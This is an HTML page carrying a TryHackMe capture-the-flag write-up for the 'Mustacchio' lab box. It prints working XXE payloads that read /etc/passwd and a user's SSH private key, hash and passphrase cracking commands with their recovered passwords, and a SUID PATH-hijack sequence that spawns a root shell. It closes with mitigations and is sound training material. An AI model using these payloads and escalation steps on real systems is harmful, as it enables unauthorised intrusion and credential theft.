@@ -1,0 +1,231 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Mustacchio — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="A SQLite backup file exposed in a public JS directory yielded an admin SHA1 hash cracked to bulldog19. Admin SSH was blocked, but a second port scan…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/mustacchio.html">
+<meta property="og:title" content="Mustacchio — TryHackMe writeup">
+<meta property="og:description" content="A SQLite backup file exposed in a public JS directory yielded an admin SHA1 hash cracked to bulldog19. Admin SSH was blocked, but a second port scan…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/mustacchio.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Mustacchio — TryHackMe writeup","description":"A SQLite backup file exposed in a public JS directory yielded an admin SHA1 hash cracked to bulldog19. Admin SSH was blocked, but a second port scan…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-08","url":"https://thecyberfarhan.github.io/writeups/mustacchio.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/mustacchio.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Mustacchio</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 8, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>A SQLite backup file exposed in a public JS directory yielded an admin SHA1 hash cracked to <code>bulldog19</code>. Admin SSH was blocked, but a second port scan uncovered an nginx admin panel on 8765. Logging in revealed an XML comment form vulnerable to XXE — used first to read <code>/etc/passwd</code>, then to pull Barry's encrypted SSH private key. John cracked the passphrase; Barry's home had the user flag. A SUID binary owned by Joe called <code>tail</code> with a relative path was hijacked via <code>$PATH</code> manipulation, spawning a root shell. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">🗄 SQLite3</span><span class="chip">🔓 Hashcat</span><span class="chip">🦊 Burp Suite</span><span class="chip">🔑 ssh2john + John the Ripper</span><span class="chip">🔐 SSH</span><span class="chip">🔬 strings</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's target is <strong>Mustacchio</strong> — a barber shop themed box that hides its vulnerabilities with the same care the barber presumably puts into a clean shave. That is to say: not much. An exposed SQLite database in a JS directory, an admin panel on a non-standard port serving raw XML to a parser that trusts it completely, and a SUID binary that calls system utilities by name rather than by path. Each layer is independently preventable, and yet here we are. The box earns its medium-leaning difficulty from the chain length rather than the complexity of any individual step — there are more moving parts here than in most easy boxes.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>What a SQLite database is and how to dump its contents</li><li>What XXE (XML External Entity) injection is and how it achieves LFI</li><li>How SHA1 hashes are cracked and why unsalted SHA1 is inadequate</li><li>What a SUID binary is and how relative <code>PATH</code> lookups enable hijacking</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan — Pass 1</h3>
+<p class="aside">Full-range sweep with RustScan, Nmap for service and version fingerprinting:</p>
+<pre><code>rustscan -a 10.48.141.220 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.2p2 Ubuntu 4ubuntu2.10</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.18 (Ubuntu)</td></tr></tbody></table>
+<p>Standard two ports on the first pass. The homepage is a barber shop landing page — <code>Mustacchio | Home</code>. Nmap flags one <code>robots.txt</code> disallowed entry: <code>/</code>, which disallows everything and reveals nothing useful.</p>
+<h3>Web Directory Enumeration</h3>
+<p class="aside">(~4 mins into the box)</p>
+<p class="aside">Feroxbuster with PHP, HTML, and TXT extensions:</p>
+<pre><code>feroxbuster -u http://10.48.141.220 \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+  -x php,txt,html</code></pre>
+<p>Most results are images and font files — cosmetic noise. The one hit that matters:</p>
+<pre><code>200  http://10.48.141.220/custom/js/users.bak   # ^^^ database backup in a JS directory</code></pre>
+<p>A <code>.bak</code> file sitting in a publicly browsable JavaScript directory is exactly as bad as it sounds.</p>
+<h3>SQLite Credential Extraction</h3>
+<p class="aside">Identifying the file type:</p>
+<pre><code>file Downloads/users.bak</code></pre>
+
+<pre><code>SQLite 3.x database, last written using SQLite version 3034001</code></pre>
+<p>Not a text file — a full SQLite database. Opened with <code>sqlite3</code>:</p>
+<p class="aside">Dumping the full database schema and contents:</p>
+<pre><code>sqlite3 Downloads/users.bak
+sqlite&gt; .dump</code></pre>
+
+<pre><code>CREATE TABLE users(username text NOT NULL, password text NOT NULL);
+INSERT INTO users VALUES('admin','1868e36a6d2b17d4c2745f1659433a54d4bc5f4b');</code></pre>
+<p>Username <code>admin</code>, password as an unsalted SHA1 hash.</p>
+<h3>Hash Cracking — Hashcat</h3>
+<p class="aside">Cracking the SHA1 hash (mode 100 = raw SHA1):</p>
+<pre><code>hashcat -m 100 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b /usr/share/wordlists/rockyou.txt</code></pre>
+
+<pre><code>1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19
+
+Status: Cracked
+Time: ~1 sec</code></pre>
+<p>Admin password: <code>bulldog19</code>.</p>
+<h3>Port Scan — Pass 2</h3>
+<p class="aside">(~15 mins into the box)</p>
+<p>SSH as <code>admin</code> was blocked immediately — the server only accepts publickey authentication. Rather than stalling, a second, deeper Nmap scan was run to check for services missed on the first pass:</p>
+<pre><code>nmap -sV -p- -T4 10.48.141.220</code></pre>
+
+<pre><code>8765/tcp open  ultraseek-http   # ^^^ missed on first scan</code></pre>
+<p>Port 8765 — a non-standard HTTP port running nginx. Navigating to <code>http://10.48.141.220:8765/</code> reveals a second login panel. <code>admin:bulldog19</code> worked.</p>
+<h2 data-reveal>Foothold</h2>
+<p class="aside">(~18 mins into the box)</p>
+<h3>XXE Injection — XML External Entity</h3>
+<p><strong>What is XXE?</strong> When an application parses user-supplied XML and the XML parser has external entity processing enabled, an attacker can define a custom entity that references a file on the server's filesystem. When the XML is processed and the entity is resolved, the file's contents are substituted in — effectively giving the attacker a file read primitive (LFI) through the XML parser.</p>
+<p>The admin panel at port 8765 presents a single comment submission form. The POST body is a <code>xml=</code> parameter — a direct XML input. A JavaScript comment in the page source also hints at <code>/auth/dontforget.bak</code>, and an HTML comment reads: <code>Barry, you can now SSH in using your key!</code></p>
+<p>Three useful signals: the parameter name, a backup file path, and a username.</p>
+<p class="aside">Fetching the backup to understand the expected XML structure:</p>
+<pre><code>cat Downloads/dontforget.bak</code></pre>
+
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;comment&gt;
+  &lt;name&gt;Joe Hamd&lt;/name&gt;
+  &lt;author&gt;Barry Clad&lt;/author&gt;
+  &lt;com&gt;...&lt;/com&gt;
+&lt;/comment&gt;</code></pre>
+<p>The XML structure the parser expects is now known. The XXE payload slots an external entity definition into the DOCTYPE and references it inside one of the existing fields.</p>
+<p class="aside">XXE payload to read <code>/etc/passwd</code> — confirming LFI:</p>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+&lt;comment&gt;
+  &lt;name&gt;Joe Hamd&lt;/name&gt;
+  &lt;author&gt;Barry Clad&lt;/author&gt;
+  &lt;com&gt;&amp;xxe;&lt;/com&gt;
+&lt;/comment&gt;</code></pre>
+<p>Sent via Burp Suite as a URL-encoded POST to <code>/home.php</code>. The response rendered the full <code>/etc/passwd</code> contents inside the comment preview — confirming XXE-to-LFI. Two user accounts confirmed: <code>joe</code> (uid 1002) and <code>barry</code> (uid 1003).</p>
+<p class="aside">XXE payload escalated to read Barry's SSH private key:</p>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" &gt;]&gt;
+&lt;comment&gt;
+  &lt;name&gt;Joe Hamd&lt;/name&gt;
+  &lt;author&gt;Barry Clad&lt;/author&gt;
+  &lt;com&gt;&amp;xxe;&lt;/com&gt;
+&lt;/comment&gt;</code></pre>
+
+<pre><code># Response (truncated)
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
+jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57...
+-----END RSA PRIVATE KEY-----</code></pre>
+<p>Barry's encrypted SSH key extracted via the XML parser. Saved locally as <code>id_rsa</code>.</p>
+<h2 data-reveal>Shell / Access</h2>
+<p class="aside">(~25 mins into the box)</p>
+<h3>SSH Key Passphrase Cracking</h3>
+<p class="aside">Converting the key to a John-crackable hash:</p>
+<pre><code>ssh2john id_rsa &gt; key.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt key.hash</code></pre>
+
+<pre><code>id_rsa:urieljames
+
+1 password hash cracked, 0 left</code></pre>
+<p>Passphrase: <code>urieljames</code>.</p>
+<p class="aside">SSH login as <code>barry</code>:</p>
+<pre><code>ssh barry@10.48.141.220 -i id_rsa
+# Enter passphrase: urieljames</code></pre>
+
+<pre><code>barry@mustacchio:~$ cat user.txt
+62d77a4d5f97d47c5aa38b3b2651b831</code></pre>
+
+<h2 data-reveal>Escalation</h2>
+<p class="aside">(~27 mins into the box)</p>
+<h3>SUID Enumeration</h3>
+<p><code>sudo -l</code> failed — <code>barry</code>'s sudo password isn't <code>urieljames</code> (the key passphrase is not the system password). On to SUID hunting.</p>
+<p class="aside">Finding all SUID binaries:</p>
+<pre><code>find / -type f -perm -u=s 2&gt;/dev/null</code></pre>
+<p>The standard system entries are expected and unremarkable. One entry is not:</p>
+<pre><code>/home/joe/live_log</code></pre>
+<p>A SUID binary in another user's home directory, with a name suggesting it reads logs in real time.</p>
+<h3>Binary Analysis — <code>strings</code></h3>
+<p class="aside">Inspecting the binary for readable strings:</p>
+<pre><code>strings /home/joe/live_log</code></pre>
+
+<pre><code>Live Nginx Log Reader
+tail -f /var/log/nginx/access.log    # ^^^ relative path — no /usr/bin/tail</code></pre>
+<p><strong>Why is this dangerous?</strong> When a program calls another program by name rather than by its full absolute path, the OS resolves the name by searching through the directories listed in the <code>$PATH</code> environment variable, left to right, stopping at the first match. If an attacker can prepend a directory they control to <code>$PATH</code> and place a malicious executable with the same name there, the SUID binary will execute the malicious version — inheriting root privileges.</p>
+<h3>PATH Hijack</h3>
+<p>The exploit: create a fake <code>tail</code> script in <code>/tmp</code> that copies <code>/bin/bash</code> with the SUID bit set, prepend <code>/tmp</code> to <code>$PATH</code>, and run <code>live_log</code>. The SUID binary runs as root, executes our fake <code>tail</code> as root, producing a SUID copy of bash in <code>/tmp</code>.</p>
+<p class="aside">Step by step:</p>
+<pre><code># Create fake tail that stamps SUID onto a bash copy
+echo -e '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod +s /tmp/bash' &gt; /tmp/tail
+chmod +x /tmp/tail
+
+# Prepend /tmp to PATH so our fake tail is found first
+export PATH=/tmp:$PATH
+
+# Trigger the SUID binary — it calls tail, finds ours first
+/home/joe/live_log</code></pre>
+
+<pre><code>Live Nginx Log Reader</code></pre>
+<p class="aside">The fake <code>tail</code> ran as root. Now spawning the SUID bash with <code>-p</code> to preserve effective UID:</p>
+<pre><code>/tmp/bash -p</code></pre>
+
+<pre><code>bash-4.3# whoami
+root</code></pre>
+<p class="aside">Collecting the root flag:</p>
+<pre><code>cat /root/root.txt</code></pre>
+
+<pre><code>3223581420d906c4dd1a5f9b530393a5</code></pre>
+
+<h2 data-reveal>The Full Chain</h2>
+<p>The full attack chain, end to end:</p>
+<ol><li><strong><code>users.bak</code> SQLite database</strong> exposed in <code>/custom/js/</code> → <code>admin:SHA1</code> hash</li><li><strong>Hashcat</strong> cracked unsalted SHA1 → <code>bulldog19</code></li><li><strong>Port 8765</strong> (missed on first scan) → nginx admin panel, <code>admin:bulldog19</code> worked</li><li><strong>XXE injection</strong> on XML POST parameter → LFI confirmed via <code>/etc/passwd</code></li><li><strong>XXE escalated</strong> to read <code>/home/barry/.ssh/id_rsa</code> → encrypted SSH key extracted</li><li><strong>John the Ripper</strong> cracked SSH key passphrase → <code>urieljames</code></li><li><strong>SSH as <code>barry</code></strong> → user flag</li><li><strong>SUID binary <code>/home/joe/live_log</code></strong> calls <code>tail</code> with relative path</li><li><strong>PATH hijack</strong> → fake <code>tail</code> in <code>/tmp</code> → SUID bash spawned</li><li><strong><code>/tmp/bash -p</code></strong> → root shell → root flag</li></ol>
+<h2 data-reveal>Rabbit Holes</h2>
+<h3>SSH as <code>admin</code></h3>
+<p>After cracking <code>bulldog19</code>, the most obvious next step was SSH as <code>admin</code>. The server rejected it immediately: <code>Permission denied (publickey)</code>. The admin account has no password authentication enabled — only publickey. The credentials were valid, just for the wrong service. Port 8765's admin panel was the actual target.</p>
+<h3>John the Ripper Failing on the SHA1 Hash</h3>
+<p><code>john</code> was tried first on the SHA1 hash and returned no results — the hash was already in John's potfile from a previous session (or from the <code>.show</code> command having been run earlier), causing it to skip silently. Switching to Hashcat with <code>-m 100</code> cracked it immediately. When John says "No password hashes left to crack," it often means the hash was already cracked in a prior run — always check <code>john --show hash.txt</code> before concluding the password is uncrackable.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Database backup exposed in web-accessible directory</td><td class="sev-critical">Critical</td><td>Never store backup files under the webroot; move to a restricted off-web location and enforce directory listing off</td></tr><tr><td>Unsalted SHA1 password hash</td><td class="sev-high">High</td><td>Use bcrypt, Argon2, or PBKDF2 for password storage; SHA1 is a digest algorithm, not a password hash — it's trivially fast to brute-force</td></tr><tr><td>XXE injection via unsanitised XML parser</td><td class="sev-critical">Critical</td><td>Disable external entity processing in the XML parser (<code>libxml_disable_entity_loader(true)</code> in PHP, or equivalent); validate and sanitise all XML input</td></tr><tr><td>SSH private key readable via LFI</td><td class="sev-high">High</td><td>Restrict <code>.ssh/</code> permissions to <code>700</code> and <code>id_rsa</code> to <code>600</code>; the file should be unreadable even to <code>www-data</code></td></tr><tr><td>SUID binary calling utilities by relative path</td><td class="sev-critical">Critical</td><td>Always use absolute paths for system calls inside privileged binaries; compile with a hardened <code>$PATH</code>; audit all SUID binaries regularly</td></tr><tr><td>Admin panel on non-standard port with no rate limiting</td><td class="sev-medium">Medium</td><td>Apply rate limiting and account lockout to all login endpoints regardless of port; do not rely on obscurity</td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>XXE is not just an academic vulnerability — when a web application parses XML and reflects the output, a single malicious DOCTYPE declaration can turn the XML parser into a filesystem reader. The moment user-supplied XML reaches a parser with external entity processing enabled, any file readable by the web process is exposed. Disabling external entities should be the default, not an afterthought.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Run the full port range scan with a slower, more thorough Nmap pass from the start rather than RustScan's default — port 8765 being on nginx (not Apache) meant it was technically on a different process and RustScan's initial fast sweep missed it. A <code>-p-</code> Nmap pass upfront saves the second scan.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/mustacchio_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
